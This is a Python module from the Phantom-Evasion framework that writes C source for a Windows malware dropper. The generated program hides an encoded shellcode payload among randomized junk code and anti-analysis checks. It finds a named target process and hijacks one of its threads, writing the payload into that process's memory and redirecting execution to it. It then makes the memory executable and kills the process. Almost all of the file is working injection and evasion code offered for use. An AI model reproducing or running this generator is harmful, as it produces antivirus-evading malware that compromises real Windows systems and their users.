
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################

import sys
from random import shuffle 
sys.path.append("Modules/payloads/auxiliar")
from usefull import encoding_manager
from usefull import readpayload_exfile
from usefull import varname_creator
from usefull import Junkmathinject
from usefull import windows_evasion
from usefull import spawn_multiple_process
from usefull import close_brackets_multiproc

Payload = readpayload_exfile()

SpawnMultiProc = int(sys.argv[1])

Encryption = sys.argv[2]

Proc_arch = sys.argv[3]

Proc_target = sys.argv[4]

Randbufname = varname_creator()

DecodeKit = encoding_manager(Encryption,Payload,Randbufname)

Payload = DecodeKit[0]     # encoded shellcode 

DecoderStub = DecodeKit[1] # decoder stub or string = False if decoder is not necessary

Randlpv = varname_creator()

Randentry = varname_creator() #entry

RandTentry = varname_creator() #te32

RandTcontext = varname_creator()

RandProcsnapshot = varname_creator() #snapshot

RandThreadsnapshot = varname_creator()

RandhProcess = varname_creator()

RandTargetThread = varname_creator()

KickThat = varname_creator()

RandPidStr = varname_creator()

Oldprot = varname_creator()

Randbool = varname_creator()

NdcVirtualProEx = varname_creator()


Junkcode_01 = Junkmathinject()
Junkcode_02 = Junkmathinject()
Junkcode_03 = Junkmathinject()
Junkcode_04 = Junkmathinject()
Junkcode_05 = Junkmathinject()
Junkcode_06 = Junkmathinject()
Junkcode_07 = Junkmathinject()
Junkcode_08 = Junkmathinject()
Junkcode_09 = Junkmathinject()
Junkcode_10 = Junkmathinject()
Junkcode_11 = Junkmathinject()
Junkcode_12 = Junkmathinject()
Junkcode_13 = Junkmathinject()
Junkcode_14 = Junkmathinject()
Junkcode_15 = Junkmathinject()
Junkcode_16 = Junkmathinject()
Junkcode_17 = Junkmathinject()
Junkcode_18 = Junkmathinject()
Junkcode_19 = Junkmathinject()
Junkcode_20 = Junkmathinject()
Junkcode_21 = Junkmathinject()
Junkcode_22 = Junkmathinject()

WinEvasion_01 = windows_evasion()
WinEvasion_02 = windows_evasion()
WinEvasion_03 = windows_evasion()
WinEvasion_04 = windows_evasion()
WinEvasion_05 = windows_evasion()
WinEvasion_06 = windows_evasion()
WinEvasion_07 = windows_evasion()
WinEvasion_08 = windows_evasion()
WinEvasion_09 = windows_evasion()


Hollow_code = ""

Include_List = ["#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <math.h>\n\n","#include <time.h>\n","#include <math.h>\n"]

shuffle(Include_List)

for i in range(0,len(Include_List)):

    Hollow_code += Include_List[i]

Hollow_code += "#include <tlhelp32.h>\n"

Hollow_code += "int main(int argc,char * argv[]){\n"
Hollow_code += Junkcode_01
Hollow_code += WinEvasion_01
Hollow_code += WinEvasion_02
Hollow_code += WinEvasion_03
Hollow_code += WinEvasion_04
Hollow_code += WinEvasion_05
Hollow_code += WinEvasion_06
Hollow_code += WinEvasion_07
Hollow_code += WinEvasion_08
Hollow_code += WinEvasion_09
Hollow_code += Junkcode_02
Hollow_code += Junkcode_03
Hollow_code += spawn_multiple_process(SpawnMultiProc)
Hollow_code += Junkcode_04
Hollow_code += Payload
Hollow_code += Junkcode_05
Hollow_code += "LPVOID " + Randlpv + ";\n"
Hollow_code += Junkcode_06


Hollow_code += "PROCESSENTRY32 " + Randentry + ";\n"
Hollow_code += Randentry + ".dwSize = sizeof(PROCESSENTRY32);\n"
Hollow_code += "HANDLE " + RandProcsnapshot + " = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n"
Hollow_code += Junkcode_07
Hollow_code += "if (Process32First(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
Hollow_code += "while (Process32Next(" + RandProcsnapshot + ", &" + Randentry + ") == TRUE){\n"
Hollow_code += "if(strcmp(" + Randentry + ".szExeFile, \"" + Proc_target + "\") == 0){\n"
Hollow_code += Junkcode_08
Hollow_code += "HANDLE " + RandhProcess + " = OpenProcess(PROCESS_ALL_ACCESS, FALSE, " + Randentry + ".th32ProcessID);\n"
Hollow_code += Junkcode_09
Hollow_code += "if(" + RandhProcess + " != NULL){\n"
Hollow_code += "HANDLE " + RandThreadsnapshot + " = INVALID_HANDLE_VALUE;\n" 
Hollow_code += "THREADENTRY32 " + RandTentry + ";\n" 
Hollow_code += RandThreadsnapshot + " = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0);\n"
Hollow_code += Junkcode_10
Hollow_code += "if(" + RandThreadsnapshot + " != INVALID_HANDLE_VALUE ) {\n"
Hollow_code += RandTentry + ".dwSize = sizeof(THREADENTRY32 );\n"
Hollow_code += Junkcode_11
Hollow_code += "if(!Thread32First(" + RandThreadsnapshot + ", &" + RandTentry + " ) ){CloseHandle(" + RandThreadsnapshot + ");}\n"
Hollow_code += "do{\n" 
Hollow_code += "if(" + RandTentry + ".th32OwnerProcessID == " + Randentry + ".th32ProcessID ){\n"
Hollow_code += "HANDLE " + RandTargetThread + " = OpenThread(THREAD_ALL_ACCESS ,FALSE," + RandTentry + ".th32ThreadID);\n"
Hollow_code += "if(" + RandTargetThread + " != NULL){\n"
Hollow_code += Junkcode_12
Hollow_code += "SuspendThread(" + RandTargetThread + ");\n"
Hollow_code += "CONTEXT " + RandTcontext + ";\n"
Hollow_code += RandTcontext +".ContextFlags = CONTEXT_FULL;\n"
Hollow_code += "if (GetThreadContext(" + RandTargetThread + ", &" + RandTcontext + ") != 0){\n"
Hollow_code += Junkcode_13

if Proc_arch == "x64":
    Hollow_code += RandTcontext + ".Rsp -= sizeof(unsigned int);\n" 
    Hollow_code += "WriteProcessMemory(" + RandhProcess + ", (LPVOID) " + RandTcontext + ".Rsp, (LPCVOID) &" + RandTcontext + ".Rip, sizeof(unsigned int), NULL);\n"

else:
    Hollow_code += RandTcontext + ".Esp -= sizeof(unsigned int);\n"
    Hollow_code += "WriteProcessMemory(" + RandhProcess + ", (LPVOID) " + RandTcontext + ".Esp, (LPCVOID) &" + RandTcontext + ".Eip, sizeof(unsigned int), NULL);\n"

Hollow_code += Junkcode_14
Hollow_code += Randlpv + " = VirtualAllocEx(" + RandhProcess + ",NULL, strlen(" + Randbufname + "),MEM_COMMIT,PAGE_READWRITE);\n"

if DecoderStub != "False":
    Hollow_code += DecoderStub
Hollow_code += "WriteProcessMemory(" + RandhProcess + "," + Randlpv + ", (LPCVOID)" + Randbufname + ",strlen(" + Randbufname + "), NULL);\n"

if Proc_arch =="x64":
    Hollow_code += RandTcontext + ".Rip = (DWORD_PTR)" + Randlpv + ";\n"
else:
    Hollow_code += RandTcontext + ".Eip = (DWORD_PTR)" + Randlpv + ";\n"
Hollow_code += "if (SetThreadContext(" + RandTargetThread + ", &" + RandTcontext + ") != 0){;\n"
Hollow_code += "DWORD " + Oldprot + ";\n"
Hollow_code += "FARPROC " + NdcVirtualProEx + " = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), \"VirtualProtectEx\");\n"
Hollow_code += "BOOL " + Randbool + " = (BOOL)" + NdcVirtualProEx + "(" + RandhProcess + "," + Randlpv + ",strlen(" + Randbufname + "),0x40,&" + Oldprot + ");\n"
Hollow_code += "ResumeThread(" + RandTargetThread + ");\n"
Hollow_code += Junkcode_15
Hollow_code += "char " + KickThat + "[] = \"taskkill /PID \";\n"
Hollow_code += "char " + RandPidStr + "[6];\n" 
Hollow_code += "strcat(" + KickThat + ",itoa(" + Randentry + ".th32ProcessID," + RandPidStr + ",10));\n"
Hollow_code += "system(" + KickThat + ");\n"
Hollow_code += "CloseHandle(" + RandThreadsnapshot + ");CloseHandle(" + RandProcsnapshot + ");\n"
Hollow_code += "CloseHandle(" + RandTargetThread + ");CloseHandle(" + RandhProcess + ");return(0);}}}}\n"
Hollow_code += "} while(Thread32Next(" + RandThreadsnapshot + ", &" + RandTentry + "));\n"
Hollow_code += "CloseHandle(" + RandThreadsnapshot + ");\n"
Hollow_code += "CloseHandle(" + RandProcsnapshot + ");}}}}}\n"
Hollow_code += close_brackets_multiproc(SpawnMultiProc)
Hollow_code += "}}}else{" + Junkcode_16 + "}\n"
Hollow_code += "}else{" + Junkcode_17 + "}\n"
Hollow_code += "}else{" + Junkcode_18 + "}\n"
Hollow_code += "}else{" + Junkcode_19 + "}\n"
Hollow_code += "}else{" + Junkcode_20 + "}\n"
Hollow_code += "}else{" + Junkcode_21 + "}\n"
Hollow_code += "}else{" + Junkcode_22 + "}\n"
Hollow_code += "return 0;}"
Hollow_code = Hollow_code.encode('utf-8')

with open('Source.c','wb') as f:
    f.write(Hollow_code)


